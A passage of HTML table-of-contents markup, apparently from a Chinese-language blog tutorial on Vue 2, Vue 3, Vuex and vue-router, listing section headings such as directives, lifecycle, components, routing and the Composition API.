toc-level-5"><a class="toc-link" href="#2-%E8%99%9A%E6%8B%9F-DOM-%E7%9A%84%E5%A5%BD%E5%A4%84"><span class="toc-text">2. 虚拟 DOM 的好处</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%99%9A%E6%8B%9FDOM%E4%B8%ADkey%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-text">3. 虚拟DOM中key的作用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E7%94%A8index%E4%BD%9C%E4%B8%BAkey%E5%8F%AF%E8%83%BD%E4%BC%9A%E5%BC%95%E5%8F%91%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-text">4. 用index作为key可能会引发的问题：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E7%BB%93%E8%AE%BA%EF%BC%9A"><span class="toc-text">5. 结论：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-13-3-%E5%88%97%E8%A1%A8%E9%81%8E%E6%BF%BE"><span class="toc-text">1.13.3 列表過濾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-13-4-%E5%88%97%E8%A1%A8%E6%8E%92%E5%BA%8F"><span class="toc-text">1.13.4 列表排序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-14-vue-%E7%9B%91%E6%B5%8B%E6%95%B8%E6%93%9A%E6%94%B9%E8%AE%8A%E7%9A%84%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90"><span class="toc-text">1.14 vue 监测數據改變的原理解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-14-1-%E6%9B%B4%E6%96%B0%E6%95%B8%E6%93%9A%E6%99%82%E7%9A%84%E5%95%8F%E9%A1%8C"><span class="toc-text">1.14.1 更新數據時的問題</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-14-2-Vue%E7%9B%A3%E6%B8%AC%E6%95%B8%E6%93%9A%E6%94%B9%E8%AE%8A%E7%9A%84%E5%8E%9F%E7%90%86-%E5%B0%8D%E8%B1%A1"><span class="toc-text">1.14.2 Vue監測數據改變的原理_對象</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Vue-%E5%A6%82%E4%BD%95%E7%9B%91%E6%B5%8B%E5%AF%B9%E8%B1%A1%E9%87%8C%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-text">1.  Vue 如何监测对象里的数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%89%8B%E5%8B%95%E6%A8%A1%E6%8B%9F-vue-%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B"><span class="toc-text">2. 手動模拟 vue 中的数据监测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-14-3-Vue-set-%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">1.14.3 Vue.set 的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-14-4-Vue%E7%9B%A3%E6%B8%AC%E6%95%B8%E6%93%9A%E6%94%B9%E8%AE%8A%E7%9A%84%E5%8E%9F%E7%90%86-%E6%95%B8%E7%B5%84"><span class="toc-text">1.14.4 Vue監測數據改變的原理_數組</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-14-5-%E7%B8%BD%E7%B5%90Vue%E6%95%B8%E6%93%9A%E7%9B%A3%E6%B8%AC%EF%BC%9A"><span class="toc-text">1.14.5 總結Vue數據監測：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-15-%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE"><span class="toc-text">1.15 收集表单数据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-15-1-%E7%B8%BD%E7%B5%90"><span class="toc-text">1.15.1 總結</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-16-%E8%BF%87%E6%BB%A4%E5%99%A8%EF%BC%88%E9%9D%9E%E9%87%8D%E7%82%B9%EF%BC%89"><span class="toc-text">1.16 过滤器（非重点）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-17-%E5%86%85%E7%BD%AE%E6%8C%87%E4%BB%A4"><span class="toc-text">1.17 内置指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-17-1-v-text%E6%8C%87%E4%BB%A4%EF%BC%9A-%E4%BD%BF%E7%94%A8%E7%9A%84%E6%AF%94%E8%BE%83%E5%B0%91"><span class="toc-text">1.17.1 v-text指令：(使用的比较少)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-17-2-v-html%E6%8C%87%E4%BB%A4%EF%BC%9A-%E4%BD%BF%E7%94%A8%E7%9A%84%E5%BE%88%E5%B0%91"><span class="toc-text">1.17.2 v-html指令：(使用的很少)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-17-3-v-cloak%E6%8C%87%E4%BB%A4%EF%BC%88%E6%B2%A1%E6%9C%89%E5%80%BC%EF%BC%89%EF%BC%9A"><span class="toc-text">1.17.3 v-cloak指令（没有值）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-17-4-v-once%E6%8C%87%E4%BB%A4%EF%BC%9A-%E7%94%A8%E7%9A%84%E5%B0%91"><span class="toc-text">1.17.4 v-once指令：(用的少)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-17-5-v-pre%E6%8C%87%E4%BB%A4%EF%BC%9A-%E6%AF%94%E8%BE%83%E6%B2%A1%E7%94%A8"><span class="toc-text">1.17.5 v-pre指令：(比较没用)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-18-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4"><span class="toc-text">1.18 自定义指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-18-1-%E5%A6%82%E4%BD%95%E8%87%AA%E5%AE%9A%E7%BE%A9%E6%8C%87%E4%BB%A4"><span class="toc-text">1.18.1 如何自定義指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-18-2-%E5%B1%80%E9%83%A8%E6%8C%87%E4%BB%A4%E8%88%87%E5%85%A8%E5%B1%80%E6%8C%87%E4%BB%A4"><span class="toc-text">1.18.2 局部指令與全局指令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%B1%80%E9%83%A8%E6%8C%87%E4%BB%A4"><span class="toc-text">1. 局部指令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%85%A8%E5%B1%80%E6%8C%87%E4%BB%A4"><span class="toc-text">2. 全局指令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-18-3-%E8%87%AA%E5%AE%9A%E7%BE%A9%E6%8C%87%E4%BB%A4%E7%B8%BD%E7%B5%90"><span class="toc-text">1.18.3 自定義指令總結</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-19-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-text">1.19 生命周期</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-19-1-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E6%B5%81%E7%A8%8B"><span class="toc-text">1.19.1 生命周期流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-19-2-%E7%94%9F%E5%91%BD%E9%80%B1%E6%9C%9F%E5%88%86%E6%9E%90"><span class="toc-text">1.19.2 生命週期分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-19-3-%E7%B8%BD%E7%B5%90%E7%94%9F%E5%91%BD%E9%80%B1%E6%9C%9F"><span class="toc-text">1.19.3 總結生命週期</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-20-%E9%9D%9E%E5%8D%95%E6%96%87%E4%BB%B6%E7%BB%84%E4%BB%B6"><span class="toc-text">1.20 非单文件组件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-20-1-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-text">1.20.1 基本使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6"><span class="toc-text">1. 定义组件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%B3%A8%E5%86%8C%E7%BB%84%E4%BB%B6"><span class="toc-text">2. 注册组件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%86%99%E7%BB%84%E4%BB%B6%E6%A0%87%E7%AD%BE"><span class="toc-text">3. 写组件标签</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%B0%8F%E7%B5%90"><span class="toc-text">4. 小結</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-20-2-%E4%BD%BF%E7%94%A8%E7%B5%84%E4%BB%B6%E7%9A%84%E6%B3%A8%E6%84%8F%E7%82%B9%EF%BC%9A"><span class="toc-text">1.20.2 使用組件的注意点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-20-3-%E7%BB%84%E4%BB%B6%E7%9A%84%E5%B5%8C%E5%A5%97"><span class="toc-text">1.20.3 组件的嵌套</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-20-4-VueComponent"><span class="toc-text">1.20.4 VueComponent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-20-5-%E4%B8%80%E4%B8%AA%E9%87%8D%E8%A6%81%E7%9A%84%E5%86%85%E7%BD%AE%E5%85%B3%E7%B3%BB"><span class="toc-text">1.20.5 一个重要的内置关系</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-21-%E5%8D%95%E6%96%87%E4%BB%B6%E7%BB%84%E4%BB%B6"><span class="toc-text">1.21 单文件组件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-vue%E8%84%9A%E6%89%8B%E6%9E%B6%EF%BC%8C%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6%EF%BC%8C%E6%8F%92%E6%A7%BD%E7%AD%89%E5%A4%8D%E6%9D%82%E5%86%85%E5%AE%B9"><span class="toc-text">2. vue脚手架，自定义事件，插槽等复杂内容</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E5%88%86%E6%9E%90%E8%84%9A%E6%89%8B%E6%9E%B6"><span class="toc-text">2.1 分析脚手架</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-1-%E8%AA%AA%E6%98%8E"><span class="toc-text">2.1.1 說明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-2-%E5%88%9D%E5%A7%8B%E5%8C%96%E8%84%9A%E6%89%8B%E6%9E%B6"><span class="toc-text">2.1.2 初始化脚手架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-3-%E8%84%9A%E6%89%8B%E6%9E%B6%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-text">2.1.3 脚手架文件结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-4-%E8%84%9A%E6%89%8B%E6%9E%B6demo"><span class="toc-text">2.1.4 脚手架demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-5-render%E5%87%BD%E6%95%B0"><span class="toc-text">2.1.5 render函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-6-%E4%BF%AE%E6%94%B9%E8%84%9A%E6%89%8B%E6%9E%B6%E7%9A%84%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE"><span class="toc-text">2.1.6 修改脚手架的默认配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-7-%E8%84%9A%E6%89%8B%E6%9E%B6%E4%B8%AD%E7%9A%84index-html"><span class="toc-text">2.1.7 脚手架中的index.html</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-vue-%E9%9B%B6%E7%A2%8E%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86"><span class="toc-text">2.2 vue 零碎的一些知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-ref%E5%B1%9E%E6%80%A7"><span class="toc-text">2.2.1 ref属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-props%E9%85%8D%E7%BD%AE%E9%A1%B9"><span class="toc-text">2.2.2 props配置项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-3-mixin-%E6%B7%B7%E5%85%A5-%E9%85%8D%E7%BD%AE%E9%A0%85"><span class="toc-text">2.2.3 mixin(混入)配置項</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-4-%E6%8F%92%E4%BB%B6"><span class="toc-text">2.2.4 插件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-5-scoped%E6%A0%B7%E5%BC%8F"><span class="toc-text">2.2.5 scoped样式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-6-%E6%80%BB%E7%BB%93TodoList%E6%A1%88%E4%BE%8B"><span class="toc-text">2.2.6 总结TodoList案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8"><span class="toc-text">2.3 浏览器本地存储</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-1-Cookie"><span class="toc-text">2.3.1 Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-2-Session"><span class="toc-text">2.3.2 Session</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-3-LocalStorage"><span class="toc-text">2.3.3 LocalStorage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-4-SessionStorage"><span class="toc-text">2.3.4 SessionStorage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-5-%E7%B8%BD%E7%B5%90WebStorage"><span class="toc-text">2.3.5 總結WebStorage</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-%E7%BB%84%E4%BB%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6"><span class="toc-text">2.4 组件自定义事件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-1-%E7%B6%81%E5%AE%9A%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6"><span class="toc-text">2.4.1 綁定自定义事件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%96%B9%E5%BC%8F%E4%B8%80%EF%BC%9Av-on"><span class="toc-text">1.  方式一：v-on</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%96%B9%E5%BC%8F%E4%BA%8C%EF%BC%9Aref"><span class="toc-text">2.  方式二：ref</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-2-%E8%A7%A3%E7%BB%91%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6"><span class="toc-text">2.4.2 解绑自定义事件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-3-%E8%87%AA%E5%AE%9A%E7%BE%A9%E4%BA%8B%E4%BB%B6%E7%B8%BD%E7%B5%90"><span class="toc-text">2.4.3 自定義事件總結</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-%E5%85%A8%E5%B1%80%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BA%BF"><span class="toc-text">2.5 全局事件总线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-6-%E6%B6%88%E6%81%AF%E8%AE%A2%E9%98%85%E4%B8%8E%E5%8F%91%E5%B8%83"><span class="toc-text">2.6 消息订阅与发布</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-7-nextTick"><span class="toc-text">2.7 nextTick</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-8-Vue%E5%B0%81%E8%A3%85%E7%9A%84%E8%BF%87%E5%BA%A6%E4%B8%8E%E5%8A%A8%E7%94%BB"><span class="toc-text">2.8 Vue封装的过度与动画</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-9-vue%E8%84%9A%E6%89%8B%E6%9E%B6%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="toc-text">2.9 vue脚手架配置代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-10-slot%E6%8F%92%E6%A7%BD"><span class="toc-text">2.10 slot插槽</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-VUEX"><span class="toc-text">3. VUEX</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E6%A6%82%E5%BF%B5"><span class="toc-text">3.1 概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E4%BD%95%E6%97%B6%E4%BD%BF%E7%94%A8%EF%BC%9F"><span class="toc-text">3.2 何时使用？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-Vuex%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%9B%BE"><span class="toc-text">3.3 Vuex工作原理图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-%E6%90%AD%E5%BB%BAvuex%E7%8E%AF%E5%A2%83"><span class="toc-text">3.4 搭建vuex环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-1-%E5%AE%89%E8%A3%9DVuex"><span class="toc-text">3.4.1 安裝Vuex</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-2-%E5%BC%95%E5%85%A5Vuex%E3%80%81%E9%85%8D%E7%BD%AEstore"><span class="toc-text">3.4.2 引入Vuex、配置store</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-text">3.5 基本使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-getters%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">3.6 getters的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-8-%E6%A8%A1%E5%9D%97%E5%8C%96-%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="toc-text">3.8 模块化+命名空间</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-vue-router"><span class="toc-text">4. vue-router</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-vue-router%E7%9B%B8%E9%97%9C%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-text">4.1 vue-router相關的理解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-1-vue-router%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-text">4.1.1 vue-router的理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-2-%E5%AF%B9-SPA-%E5%BA%94%E7%94%A8%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-text">4.1.2 对 SPA 应用的理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-3-%E8%B7%AF%E7%94%B1%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-text">4.1.3 路由的理解</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%BB%80%E9%BA%BC%E6%98%AF%E8%B7%AF%E7%94%B1"><span class="toc-text">1. 什麼是路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1%E5%88%86%E7%B1%BB"><span class="toc-text">2.  路由分类</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-text">4.2 基本使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E5%87%A0%E4%B8%AA%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-text">4.2 几个注意点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-%E5%A4%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%EF%BC%88%E5%B5%8C%E5%A5%97%E8%B7%AF%E7%94%B1%EF%BC%89"><span class="toc-text">4.3 多级路由（嵌套路由）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E8%B7%AF%E7%94%B1%E7%9A%84query%E5%8F%82%E6%95%B0"><span class="toc-text">4.4 路由的query参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5-%E5%91%BD%E5%90%8D%E8%B7%AF%E7%94%B1"><span class="toc-text">4.5 命名路由</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-6-%E8%B7%AF%E7%94%B1%E7%9A%84params%E5%8F%82%E6%95%B0"><span class="toc-text">4.6 路由的params参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-7-%E8%B7%AF%E7%94%B1%E7%9A%84props%E9%85%8D%E7%BD%AE"><span class="toc-text">4.7 路由的props配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-8-lt-router-link-gt-%E7%9A%84replace%E5%B1%9E%E6%80%A7"><span class="toc-text">4.8 &lt;router-link&gt;的replace属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-9-%E7%BC%96%E7%A8%8B%E5%BC%8F%E8%B7%AF%E7%94%B1%E5%AF%BC%E8%88%AA"><span class="toc-text">4.9 编程式路由导航</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-10-%E7%BC%93%E5%AD%98%E8%B7%AF%E7%94%B1%E7%BB%84%E4%BB%B6"><span class="toc-text">4.10 缓存路由组件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-11-%E4%B8%A4%E4%B8%AA%E6%96%B0%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90"><span class="toc-text">4.11 两个新的生命周期钩子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-12-%E8%B7%AF%E7%94%B1%E5%AE%88%E5%8D%AB"><span class="toc-text">4.12 路由守卫</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-12-1-%E5%85%A8%E5%B1%80%E5%AE%88%E5%8D%AB"><span class="toc-text">4.12.1 全局守卫:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-12-2-%E7%8B%AC%E4%BA%AB%E5%AE%88%E5%8D%AB"><span class="toc-text">4.12.2 独享守卫:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-12-3-%E7%BB%84%E4%BB%B6%E5%86%85%E5%AE%88%E5%8D%AB%EF%BC%9A"><span class="toc-text">4.12.3 组件内守卫：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-13-%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F"><span class="toc-text">4.13 路由器的两种工作模式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-Vue-UI-%E7%BB%84%E4%BB%B6%E5%BA%93"><span class="toc-text">5. Vue UI 组件库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%B8%B8%E7%94%A8-UI-%E7%BB%84%E4%BB%B6%E5%BA%93"><span class="toc-text">5.1 移动端常用 UI 组件库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-PC-%E7%AB%AF%E5%B8%B8%E7%94%A8-UI-%E7%BB%84%E4%BB%B6%E5%BA%93"><span class="toc-text">5.2 PC 端常用 UI 组件库</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#triangular-flag-on-post-Vue3-%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B"><span class="toc-text">:triangular_flag_on_post: Vue3 快速上手</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E7%AE%80%E4%BB%8B"><span class="toc-text">1. 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E6%80%A7%E8%83%BD%E7%9A%84%E6%8F%90%E5%8D%87"><span class="toc-text">1.1 性能的提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E6%BA%90%E7%A0%81%E7%9A%84%E5%8D%87%E7%BA%A7"><span class="toc-text">1.2 源码的升级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-%E6%8B%A5%E6%8A%B1TypeScript"><span class="toc-text">1.3 拥抱TypeScript</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-%E6%96%B0%E7%9A%84%E7%89%B9%E6%80%A7"><span class="toc-text">1.4 新的特性</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAVue%E9%A1%B9%E7%9B%AE"><span class="toc-text">2. 创建一个Vue项目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E4%BD%BF%E7%94%A8-vue-cli-%E5%88%9B%E5%BB%BA"><span class="toc-text">2.1 使用 vue-cli 创建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E4%BD%BF%E7%94%A8-vite-%E5%88%9B%E5%BB%BA-%E4%BA%86%E8%A7%A3"><span class="toc-text">2.2 使用 vite 创建 (了解)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E5%88%86%E6%9E%90%E5%B7%A5%E7%A8%8B%E7%B5%90%E6%A7%8B"><span class="toc-text">2.3 分析工程結構</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-1-main-js"><span class="toc-text">2.3.1 main.js</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-2-App-vue"><span class="toc-text">2.3.2 App.vue</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%B8%B8%E7%94%A8-Composition-API"><span class="toc-text">3. 常用 Composition API</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E6%8B%89%E5%BC%80%E5%BA%8F%E5%B9%95%E7%9A%84setup"><span class="toc-text">3.1 拉开序幕的setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-ref%E5%87%BD%E6%95%B0"><span class="toc-text">3.2 ref函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-reactive%E5%87%BD%E6%95%B0"><span class="toc-text">3.3 reactive函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-Vue3-0%E4%B8%AD%E7%9A%84%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86"><span class="toc-text">3.4 Vue3.0中的响应式原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-1-vue2-x%E7%9A%84%E5%93%8D%E5%BA%94%E5%BC%8F"><span class="toc-text">3.4.1 vue2.x的响应式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-2-Vue3-0%E7%9A%84%E5%93%8D%E5%BA%94%E5%BC%8F"><span class="toc-text">3.4.2 Vue3.0的响应式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-reactive%E5%AF%B9%E6%AF%94ref"><span class="toc-text">3.5 reactive对比ref</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-setup%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-text">3.6 setup的两个注意点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E4%B8%8E%E7%9B%91%E8%A7%86"><span class="toc-text">3.7 计算属性与监视</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-7-1-computed%E5%87%BD%E6%95%B0"><span class="toc-text">3.7.1 computed函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-7-2-watch%E5%87%BD%E6%95%B0"><span class="toc-text">3.7.2 watch函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-7-3-watchEffect%E5%87%BD%E6%95%B0"><span class="toc-text">3.7.3 watchEffect函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 